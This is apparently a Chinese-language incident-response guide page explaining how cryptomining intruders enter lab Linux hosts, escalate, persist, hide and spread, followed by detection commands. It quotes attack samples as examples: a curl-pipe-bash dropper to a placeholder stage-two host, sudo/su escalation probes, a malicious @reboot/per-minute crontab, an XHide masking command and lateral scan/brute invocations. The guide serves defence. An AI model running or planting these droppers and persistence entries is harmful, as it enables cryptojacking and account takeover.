# 入侵手法

挖矿入侵通常是一条完整的流水线：找入口、拿账号、提权、做持久化、放矿机、连矿池、横向扩散。理解这条流水线，才能知道每一步该在哪里拦、在主机上该看什么。

本页只讲通用手法，不包含具体事件复盘。

## 攻击者要什么

| 目标 | 说明 |
|---|---|
| 算力 | CPU、GPU 都可以挖矿。 |
| 带宽 | 下载载荷、连接矿池、作为代理或 DDoS 跳板。 |
| 持久化 | 重启、改密码、删文件之后还能回来。 |
| 凭据 | 同网段其他机器的账号密码、SSH 公钥、云平台 token。 |
| 跳板 | 用失陷主机扫描和爆破内网，降低暴露自己的风险。 |

## 常见入口

### 密码爆破

攻击者不需要任何漏洞，只要目标允许密码登录、账号密码强度不足，就可以用字典反复尝试。

常见暴露方式：

- 路由器把 22 端口直接映射到公网；
- 用 ngrok、花生壳等内网穿透工具，把内网 22 端口暴露到公网；
- 云主机或虚拟机有公网 IP / IPv6，防火墙默认放行；
- UPnP 自动开端口，管理员自己都不知道。

爆破成功的标志：

```text
Accepted password for <user> from <ip> port <port> ssh2
```

如果来源是 `127.0.0.1`，不要以为就是本机登录。内网穿透工具会把外部连接转成回环地址，sshd 只能看到 `127.0.0.1`。这时要同时看内网穿透工具的日志、隧道配置和认证日志。

### 低等级密码和未知密钥

弱密码不只是“123456”。以下情况同样危险：

- 新账号创建时使用临时密码，之后没有强制修改；
- 服务账号、测试账号长期不登录，密码从不轮换；
- 同一个密码在 GPU 虚拟机、宿主机、代码仓库、VPN 中复用；
- 把密码写在脚本、`.bash_history`、Notebook、配置文件或聊天记录里；
- 账号已经不需要，但没有删除或锁定。

攻击者拿到一个密码后，会优先在相邻主机上试同一个密码。实验室机器数量有限、账号体系相似，复用密码的收益很高。

注意：所有的用户应该检查自己的密码和密钥情况。

### 不明脚本和安装包

常见形式：

- `curl ... | bash`、`wget ... -O- | sh`；
- 假冒的安装脚本、驱动、CUDA 补丁、模型权重；
- 来源不明的 pip / npm / conda 包；
- 别人发来的“一键环境”“自动挂机脚本”；
- AI 生成的、没有经过审查的系统命令；
- 盗版软件、破解工具、激活脚本。

这类入口不一定需要弱密码，用户自己执行就完成了投递。下面是近期的一个真实样本：

```bash
curl -s http://<stage2>/.x/black3 | bash
```

它负责下载第二阶段脚本。第二阶段的地址不可达时，样本还会尝试备用域名。

### 旧账号、孤儿家目录

账号删除不等于痕迹删除。常见问题：

- `userdel` 没有加 `-r`，`/home/<user>` 还在；
- 账号删除了，但 `/etc/cron.d`、systemd timer、`authorized_keys` 还在；
- 旧家目录里的恶意脚本被系统 cron 以 root 身份执行。

2026年11月编写文档时，就发现了一个此前遗留下来的家目录。`/etc/passwd` 里已经没有对应的旧测试账号，但家目录里保留了 XMRig、进程伪装工具、启动器和 `cron.d` 持久化。系统 cron 不关心账号是否存在，仍然会按 root 执行。

### 其他入口

- 暴露到公网的 Jupyter、TensorBoard、Redis、MySQL、Docker API；
- 容器以 `--privileged` 运行，或挂载了宿主机根目录；
- Web 应用漏洞、弱口令后台；
- 盗版软件、破解补丁、来源不明的模型文件；
- 钓鱼邮件、聊天工具里发来的“数据集”或“脚本”。

对实验室来说，最优先处理的仍然是 SSH、隧道和账号，因为它们直接决定攻击者能不能进来。

## 入侵流程

攻击者进入后通常按下面的顺序操作。不是每个样本都完整执行，但顺序和目的很稳定。

| 阶段 | 常见动作 | 主机上的痕迹 |
|---|---|---|
| 侦察 | `whoami`、`id`、`nproc`、`uname -a`、看 `/etc/passwd`、看 GPU | shell 历史、审计日志、短时间内的多条命令。 |
| 提权尝试 | `sudo -n`、`sudo -S`、`su`、找 SUID、找可写服务 | `sudo`/`su` 失败日志、异常 SUID。 |
| 持久化 | 写 `authorized_keys`、改密码、写 crontab、systemd、`cron.d` | 新公钥、密码变更、crontab、unit 文件。 |
| 投放载荷 | 下载 loader、矿机、watchdog、dropper | `/var/tmp`、`/tmp`、`/dev/shm` 下的可执行文件。 |
| 隐藏 | 随机目录、随机进程名、UPX、strip、`PPID=1` | `/proc/<pid>/exe` 指向临时目录或已删除文件。 |
| 对抗 | `pkill` 竞品矿机、清历史、删日志、日志洪泛 | 日志断档、进程被无故终止、`.bash_history` 被清空。 |
| 外联 | C2、矿池、凭据外传 | `ESTAB` 到陌生 443/222/3333/9000 端口。 |
| 横向 | 用同一密码 SSH 到邻居、扫描 22 端口 | 大量出站 22、同刻多台机器登录。 |

### 提权尝试

样本会先尝试非交互式提权，失败也继续以普通用户身份运行：

```bash
sudo -n true          # 看是否有免密 sudo
sudo -S ...           # 从标准输入喂密码
su -c ...             # 尝试 root 密码
```

如果这些失败，攻击者仍然可以用普通账号挖矿、写自己的 crontab、植入自己的公钥。**不要因为“没有 root”就低估影响。**

### 持久化

1. **SSH 公钥**：写入 `~/.ssh/authorized_keys`，之后改密码也能进。
2. **用户 crontab**：覆盖 `@reboot`、`@daily`、`@monthly`、每分钟和每 30 分钟。
3. **系统 cron**：`/etc/crontab`、`/etc/cron.d/*`、`/etc/cron.{daily,hourly,...}`，以 root 运行。
4. **systemd**：系统 unit、用户 unit、timer，名称可能伪装成正常服务。
5. **Shell 启动文件**：`~/.bashrc`、`~/.profile`、`/etc/profile.d/*.sh`、`/etc/rc.local`。

其他位置还包括 `at` 任务、`ld.so.preload`、桌面自启动目录、容器 restart policy 等。

下面是一个典型的用户 crontab 的真实例子：

```text
@daily   /var/tmp/<8位十六进制>/./<watchdog> > /dev/null 2>&1 & disown
@reboot  /var/tmp/<8位十六进制>/./<watchdog> > /dev/null 2>&1 & disown
* * * * * /var/tmp/<8位十六进制>/./<watchdog> > /dev/null 2>&1 & disown
@monthly /var/tmp/<8位十六进制>/./<watchdog> > /dev/null 2>&1 & disown
*/30 * * * * /var/tmp/<8位十六进制>/./.c > /dev/null 2>&1 & disown
```

它的路径会每分钟被重写，目标目录也会轮换。这意味着：

- 只删目录，crontab 还在，下一分钟会指向新目录；
- 只清 crontab，正在运行的进程会重新写回来；
- 只杀进程，cron 下一分钟会重新拉起。

### 分工

一个完整的挖矿包通常不只一个文件：

| 角色 | 作用 | 例子 |
|---|---|---|
| dropper | 下载第二阶段脚本 | 241 字节的 `.c`，用 `curl` 下载后交给 `bash` 执行 |
| loader | 解包、解密、启动主程序 | `placi` 之类的加载器 |
| miner | 真正挖矿 | `wildrig-multi`、XMRig |
| watchdog | 定时检查矿机是否活着，死了就重启 | `66c34b8c`、`7dc95c7c`、`.cache1/upd` |
| C2 客户端 | 接收指令、上报状态、下载新载荷 | `40c7ea99`、`cache` |
| 进程伪装 | 把进程名伪装成 `-bash` 等 | XHide：`h64 -s -bash ./bash` |
| 横向工具 | 扫描、爆破、复用凭据 | `./a <内网前缀> 22`、`./brute ...` |

矿机本身可能是公开的开源软件（例如 XMRig、wildrig），所以杀毒引擎不一定报毒。判断时要看**位置、父进程、启动方式、外联和持久化**，不能只看文件名。

### 隐藏和对抗

常见手法：

- 目录名用 8 位随机十六进制，例如 `/var/tmp/84a4181c`；
- 目录和 crontab 每分钟轮换，增加“删了又回来”的错觉；
- 进程名用 8 位十六进制、`cache`、`-bash` 等，伪装成正常进程；
- 二进制用 UPX 加壳、strip 去掉符号，静态链接，减少依赖；
- `PPID=1`，脱离 SSH 会话，终端关掉也继续跑；
- 删除 `/tmp` 下的日志、`.bash_history`、cloud-init 痕迹；
- `pkill` 掉竞品矿机（`xmrig`、`kdevtmpfsi`、`SRBMiner` 等），独占资源；
- 制造大量 SSH 日志，把 journald 压垮，形成日志盲区；
- 使用 443、222 等常见端口，混在正常流量里。

### 外联

近期观测到的样本在落地后很快做了三件事：

1. 读取 `/tmp/d.log` 中暂存的密码；
2. 修改被入侵账号的密码；
3. 通过 HTTP `PUT` 把新密码发送到外部地址。

这说明攻击者的目标不只是算力，还包括**长期控制账号**。所以处置时不能只杀矿机，必须同时：

- 重置受影响账号的密码；
- 删除陌生公钥；
- 检查同密码的其他机器；
- 轮换隧道 token、API token、云平台凭据；
- 检查 `~/.ssh`、`.bash_history`、配置文件里是否还有密码。

## 常见误区

| 只做了 | 会发生什么 |
|---|---|
| 杀掉矿机进程 | cron、watchdog 或 systemd 在下一分钟重新拉起。 |
| 删除 `/var/tmp/<随机>` 目录 | crontab 仍指向该路径，或进程马上创建新目录。 |
| 清空用户 crontab | 正在运行的进程会重新写入。 |
| 删除 `authorized_keys` 里的 key | 密码可能已被改掉，攻击者仍能登录。 |
| 重置密码 | 公钥后门仍然有效。 |
| 关闭一条隧道 | 另一条隧道、路由器映射或 IPv6 入口仍然开放。 |
| 清理一台机器 | 同网段其他机器可能已经被横向感染。 |
| 直接重启 | 持久化可能仍然生效，同时丢失内存和连接证据。 |

正确的顺序不是“删文件”，而是“切断重生链”：先控制 cron/systemd 和进程，再清持久化，再删文件，最后验证多个周期。

## 检测内容

### 初始访问

先检查 SSH 认证日志，重点关注短时间内的大量失败登录、异常成功登录、来源地址集中变化，以及来源显示为 `127.0.0.1` 的登录。回环地址不一定代表操作者就在本机，也可能是隧道或代理转发后的结果。可以执行：

```bash
grep -a 'Failed password' /var/log/auth.log
grep -a 'Accepted' /var/log/auth.log
last
journalctl -u ssh
```

将认证日志与隧道工具日志、路由器端口映射和云防火墙记录对照，可以判断登录是直接来自公网，还是经过内网穿透进入。还要记录受影响账号、登录时间、来源地址和使用的认证方式，便于检查同一时间段的其他主机。

### 执行与载荷投放

挖矿程序经常先落在 `/var/tmp`、`/tmp` 或 `/dev/shm`，随后由 shell、cron 或 watchdog 启动。检查这些目录中的可执行文件、最近创建的文件，以及由 `sh -c`、`bash -c` 或下载命令启动的进程：

```bash
find /var/tmp /tmp /dev/shm -type f -perm -111
ps auxww
```

发现文件后，不要只按文件名判断。应继续查看文件的创建时间、属主、父进程、命令行和网络连接；即使文件已经删除，也要检查 `/proc/<pid>/exe` 是否仍指向已删除的临时文件。对 `curl`、`wget` 下载后直接交给 `bash` 或 `sh` 执行的行为，应保留 URL、脚本内容和执行时间。

### 提权

检查攻击者是否尝试过 `sudo`、`su` 或利用 SUID 程序提权。失败记录同样有价值，因为攻击者可能在没有 root 权限的情况下继续挖矿和建立用户级持久化：

```bash
grep -a 'sudo:' /var/log/auth.log
sudo find / -xdev -type f -perm -4000 -ls
```

将异常 SUID 文件与系统基线或软件包清单比较，重点关注临时目录、用户家目录和近期修改过的文件。检查 `sudoers` 及其包含目录中是否出现了不熟悉的免密规则，并注意攻击者可能删除或修改日志来掩盖尝试。

### 持久化

持久化检查不能只看当前用户的 crontab。应逐个检查受影响用户以及 root 的任务，同时查看系统 cron、systemd unit、timer、用户 unit、`authorized_keys` 和 shell 启动文件：

```bash
ssh-keygen -lf ~/.ssh/authorized_keys
crontab -l
sudo crontab -l
systemctl list-timers --all
systemctl list-unit-files --state=enabled
```

继续检查 `/etc/cron.d`、`/etc/crontab`、`/var/spool/cron`、`~/.config/systemd/user`、`~/.bashrc` 和 `~/.profile`。记录每个任务的路径、属主、修改时间和执行身份。随机目录、重定向到 `/dev/null` 的命令、每分钟运行的任务，以及指向不存在文件的任务，都值得进一步调查。删除持久化前应先保存副本和时间线，避免丢失取证信息。

### 隐藏与进程核查

使用进程列表确认是否存在随机名称、伪装成 `-bash` 或 `cache` 的进程，以及父进程为 `1` 的孤立进程：

```bash
ps -eo user,pid,ppid,lstart,args --sort=start_time
readlink /proc/<pid>/exe
```

对可疑 PID 还应检查其当前工作目录、打开的文件、环境变量和映射文件。`/proc/<pid>/exe` 指向 `/tmp`、`/var/tmp` 或标记为 `(deleted)`，通常说明程序已经删除落地文件但仍在运行。进程名正常并不能排除风险，父子关系和启动来源比名称更可靠。

### 外联

检查主机当前连接和监听端口，重点关注陌生的 `ESTAB` 连接、矿池常见端口、伪装成 HTTPS 的长连接，以及由临时目录程序发起的连接：

```bash
ss -tunap
lsof -i
```

记录远端 IP、端口、进程 PID、域名解析结果和连接开始时间。将这些信息与 DNS、代理、防火墙和出口流量日志对照，可以区分矿池连接、C2 通信和正常业务。即使当前没有连接，也要检查历史 DNS、连接监控和程序配置，因为攻击者可能暂时停止矿机或使用定时连接。

### 横向移动

检查是否存在异常的出站 SSH、同一账号在多台机器上同时登录，以及从本机发起的端口扫描或密码尝试：

```bash
ss -tnp
journalctl -u ssh
```

将本机的出站连接与其他主机的 SSH 日志按时间对齐，查找同一来源地址连续访问多台机器的情况。还应检查命令历史、脚本参数、SSH 配置和 `known_hosts`，确认是否使用了复用密码、私钥或自动化扫描工具。发现横向迹象后，应立即扩大排查范围，不能只清理最先发现的主机。

### 影响评估

最后确认资源消耗和业务影响。持续高 CPU、GPU 满载、风扇高速运行、温度升高、系统负载异常或电费增加，都可能是挖矿造成的：

```bash
top
nvidia-smi
uptime
```

记录 CPU、GPU、内存、磁盘、网络使用率和持续时间，并与正常基线比较。GPU 利用率高不一定就是挖矿，也可能来自实验任务，因此要结合进程、启动方式、钱包或矿池配置、外联目标和持久化证据综合判断。完成清理后，应在多个 cron 和 systemd 周期内重复检查，确认资源使用恢复且没有新的进程或连接出现。

更完整的命令和判读方法见[入侵排查与命令](inspect.md)。
